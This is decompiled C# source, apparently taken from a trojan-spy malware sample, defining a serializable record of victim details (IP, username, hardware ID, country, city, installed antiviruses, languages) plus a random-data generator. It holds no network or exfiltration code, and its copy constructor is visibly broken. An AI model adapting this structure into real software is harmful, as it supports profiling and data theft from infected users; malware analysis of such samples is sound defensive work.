// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Common.RemoteClientInformation
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using ProtoBuf;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;

namespace NoiseMe.Drags.App.Models.Common
{
  [ProtoContract(Name = "RemoteClientInformation")]
  public class RemoteClientInformation : 
    INotifyPropertyChanged,
    IEqualityComparer<RemoteClientInformation>
  {
    private static readonly Random _random = new Random();
    private const string _upperChars = "QWERTYUIOPASDFGHJKLZXCVBNM";
    private static readonly string _lowerChars = "QWERTYUIOPASDFGHJKLZXCVBNM".ToLower();
    private int _iD;
    private string _city;
    private string _currentLanguage;
    private string _monitorSize;
    private string _timeZone;
    private string _hardwareID;
    private string _clientIP;
    private string _userName;
    private string _sourceID;
    private string _operationSystem;
    private string _country;
    private List<Hardware> _hardwares;
    private DateTime _logTime;
    private List<string> _antiviruses;
    private List<string> _languages;

    public RemoteClientInformation()
    {
    }

    public RemoteClientInformation(RemoteClientInformation remoteClientInformation)
    {
      this.ID = this.ID;
      this.HardwareID = this.HardwareID;
      this.ClientIP = this.ClientIP;
      this.UserName = this.UserName;
      this.SourceID = this.SourceID;
      this.OperationSystem = this.OperationSystem;
      this.Country = this.Country;
      this.Hardwares = this.Hardwares;
      this.LogTime = this.LogTime;
      this.Antiviruses = this.Antiviruses;
      this.Languages = this.Languages;
      this.CurrentLanguage = this.CurrentLanguage;
      this.MonitorSize = this.MonitorSize;
      this.TimeZone = this.TimeZone;
      this.City = this.City;
    }

    [ProtoMember(1, Name = "ID")]
    public int ID
    {
      get => this._iD;
      set
      {
        this._iD = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (ID)));
      }
    }

    [ProtoMember(2, Name = "HardwareID")]
    public string HardwareID
    {
      get => this._hardwareID;
      set
      {
        this._hardwareID = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (HardwareID)));
      }
    }

    [ProtoMember(3, Name = "ClientIP")]
    public string ClientIP
    {
      get => this._clientIP;
      set
      {
        this._clientIP = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs("HardwareID"));
      }
    }

    [ProtoMember(4, Name = "UserName")]
    public string UserName
    {
      get => this._userName;
      set
      {
        this._userName = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (UserName)));
      }
    }

    [ProtoMember(5, Name = "SourceID")]
    public string SourceID
    {
      get => this._sourceID;
      set
      {
        this._sourceID = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (SourceID)));
      }
    }

    [ProtoMember(6, Name = "OperationSystem")]
    public string OperationSystem
    {
      get => this._operationSystem;
      set
      {
        this._operationSystem = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (OperationSystem)));
      }
    }

    [ProtoMember(7, Name = "Country")]
    public string Country
    {
      get => this._country;
      set
      {
        this._country = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Country)));
      }
    }

    [ProtoMember(8, Name = "Hardwares")]
    public List<Hardware> Hardwares
    {
      get => this._hardwares ?? (this._hardwares = new List<Hardware>());
      set
      {
        this._hardwares = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Hardwares)));
      }
    }

    [ProtoMember(9, Name = "LogTime")]
    public DateTime LogTime
    {
      get => this._logTime;
      set
      {
        this._logTime = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (LogTime)));
      }
    }

    [ProtoMember(10, Name = "Antiviruses")]
    public List<string> Antiviruses
    {
      get => this._antiviruses ?? (this._antiviruses = new List<string>());
      set
      {
        this._antiviruses = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Antiviruses)));
      }
    }

    [ProtoMember(11, Name = "Languages")]
    public List<string> Languages
    {
      get => this._languages;
      set
      {
        this._languages = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Languages)));
      }
    }

    [ProtoMember(12, Name = "CurrentLanguage")]
    public string CurrentLanguage
    {
      get => this._currentLanguage;
      set
      {
        this._currentLanguage = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (CurrentLanguage)));
      }
    }

    [ProtoMember(13, Name = "MonitorSize")]
    public string MonitorSize
    {
      get => this._monitorSize;
      set
      {
        this._monitorSize = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (MonitorSize)));
      }
    }

    [ProtoMember(14, Name = "TimeZone")]
    public string TimeZone
    {
      get => this._timeZone;
      set
      {
        this._timeZone = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (TimeZone)));
      }
    }

    [ProtoMember(15, Name = "City")]
    public string City
    {
      get => this._city;
      set
      {
        this._city = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (City)));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    public static RemoteClientInformation CreateRandom() => new RemoteClientInformation()
    {
      ClientIP = string.Format("{0}.{1}.{2}.{3}", (object) RemoteClientInformation._random.Next(0, (int) byte.MaxValue), (object) RemoteClientInformation._random.Next(0, (int) byte.MaxValue), (object) RemoteClientInformation._random.Next(0, (int) byte.MaxValue), (object) RemoteClientInformation._random.Next(0, (int) byte.MaxValue)),
      Country = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 2),
      HardwareID = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 20),
      Hardwares = new List<Hardware>(),
      LogTime = DateTime.Now,
      OperationSystem = "WIN10 " + RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 5) + " Edition",
      SourceID = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM" + RemoteClientInformation._lowerChars, 6),
      UserName = RemoteClientInformation.RandomString(RemoteClientInformation._lowerChars, 10)
    };

    private static string RandomString(string sourceChars, int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
        stringBuilder.Append(sourceChars[RemoteClientInformation._random.Next(0, sourceChars.Length - 1)]);
      return stringBuilder.ToString();
    }

    public bool Equals(RemoteClientInformation x, RemoteClientInformation y) => x.HardwareID == y.HardwareID;

    public int GetHashCode(RemoteClientInformation obj)
    {
      int hashCode = 37 * 397;
      if (!string.IsNullOrEmpty(obj.HardwareID))
        hashCode += obj.HardwareID.GetHashCode();
      return hashCode;
    }
  }
}
